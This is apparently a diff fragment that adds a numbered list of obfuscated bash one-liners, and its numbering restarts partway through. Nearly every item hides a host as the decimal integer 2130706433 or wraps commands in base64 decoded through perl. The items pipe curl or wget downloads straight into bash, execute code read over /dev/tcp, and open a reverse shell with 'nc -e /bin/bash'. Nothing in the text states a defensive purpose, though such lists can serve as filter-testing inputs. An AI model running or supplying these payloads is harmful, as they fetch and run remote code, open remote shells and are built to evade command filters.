+24. `bash -c "nslookup 2130706433 && bash -c \$(echo dW5hbWUgLWE= | base64 -d)"`
+25. `bash -c "eval \$(curl -s http://2130706433/init.sh)"`
+26. `bash -c "host 2130706433 && bash -c \$(perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< 'dW5hbWUgLWE=')"`
+27. `bash -c "dd if=/dev/tcp/2130706433/80 bs=1024 count=1 | bash"`
+28. `bash -c "exec 3<>/dev/tcp/2130706433/80; echo GET / HTTP/1.1 >&3; cat <&3 | bash"`
+29. `bash -c "PERL5OPT=-MMIME::Base64 perl -e 'print decode_base64(\"dW5hbWUgLWE=\")' | bash"`
+30. `bash -c "$(curl http://2130706433/script.b64 | base64 -d)"`
+1. `bash -c "PERL5OPT=-MMIME::Base64 perl -ne 'print decode_base64(\"dW5hbWUgLWE=\")' | bash #ip=2130706433"`
+2. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash #2130706433"`
+3. `bash -c "curl --resolve localhost:80:2130706433 http://localhost/script.sh | bash"`
+4. `bash -c "curl http://[2130706433]/payload.sh | bash"`
+5. `bash -c "perl -e 'print scalar reverse(\"dW5hbWUgLWE=\")' | rev | base64 -d | bash"`
+6. `bash -c "perl -MMIME::Base64 -e 'print decode_base64(\"dW5hbWUgLWE=\")' | bash #@2130706433"`
+7. `bash -c "perl -e 'use Socket; print inet_ntoa(pack(\"N\",2130706433));'"`
+8. `bash -c "IPINT=2130706433; echo \$IPINT | perl -ne 'print \"Using \$_.\\n\"'"`
+9. `bash -c "read a <<< 2130706433 && echo \$a | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash"`
+10. `bash -c "echo 'dW5hbWUgLWE=' > /tmp/.x && perl -MMIME::Base64 -ne 'print decode_base64(\$_)' /tmp/.x | bash"`
+11. `bash -c "exec 5<>/dev/tcp/2130706433/8080; cat <&5 | bash"`
+12. `bash -c "nc -n 2130706433 9999 | bash"`
+13. `bash -c "curl -H 'Host: 2130706433' http://example.local/script.sh | bash"`
+14. `bash -c "IP=2130706433 && curl http://\$IP/init.sh | bash"`
+15. `bash -c "ping -c 1 2130706433 && bash -c \$(echo dW5hbWUgLWE= | base64 -d)"`
+16. `bash -c "host -W 2 2130706433 && perl -MMIME::Base64 -ne 'print decode_base64(\"dW5hbWUgLWE=\")' | bash"`
+17. `bash -c "printf 'dW5hbWUgLWE=' | base64 -d | bash #ip-int"`
+18. `bash -c "dig +short -x 2130706433 && base64 -d <<< dW5hbWUgLWE= | bash"`
+19. `bash -c "URL=http://2130706433/payload; wget -qO- \$URL | bash"`
+20. `bash -c "echo '2130706433' | awk '{print}' && perl -MMIME::Base64 -ne 'print decode_base64(\"dW5hbWUgLWE=\")' | bash"`
+21. `bash -c "set -- 2130706433 && echo \$1 | xargs -I{} echo {} | perl -MMIME::Base64 -ne 'print decode_base64(\"dW5hbWUgLWE=\")' | bash"`
+22. `bash -c "timeout 3 nc -n 2130706433 4444 -e /bin/bash"`
+23. `bash -c "echo 2130706433 | perl -ne 'print \"fake ip: \$_\\n\"'"`
+24. `bash -c "IPINT=2130706433; perl -e 'print scalar reverse(\"=EALWgU5d\")' | rev | base64 -d | bash"`
+25. `bash -c "perl -e 'use Socket; print inet_ntoa(pack(\"N\",2130706433))' | xargs echo"`
+26. `bash -c "curl http://2130706433:80/shell.b64 | base64 -d | bash"`
+27. `bash -c "base64 -d <<<'dW5hbWUgLWE=' | bash #recoded-IP"`
+28. `bash -c "read ip <<< 2130706433; echo \$ip | perl -ne 'print'"`
+29. `bash -c "curl http://2130706433 | base64 -d | bash"`
+30. `bash -c "HOST=2130706433 && ping -c1 \$HOST && echo 'dW5hbWUgLWE=' | base64 -d | bash"`
